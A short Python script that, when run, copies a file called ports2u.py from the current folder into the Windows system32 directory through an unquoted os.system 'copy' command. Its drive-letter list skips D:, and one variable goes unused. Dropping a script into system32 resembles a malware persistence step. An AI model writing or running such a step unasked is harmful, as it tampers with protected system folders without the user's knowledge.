import os
from pathlib import Path


def iter_drives():
    ports2u_location = str(Path.cwd()) + r'\ports2u.py'


    #  Possible drive letters
    drive_letters = ['A:', 'B:', 'C:', 'E:', 'F:', 'G:', 'H:', 'I:',
'J:', 'K:', 'L:', 'M:', 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:',
'V:', 'W:', 'X:', 'Y:', 'Z:']

    for possible_drives in drive_letters:
        if possible_drives in ports2u_location:
            path_to_var = Path(fr'{possible_drives}\Windows\system32')
            copy_files = os.system(fr'copy {ports2u_location} \Windows\system32')


iter_drives()

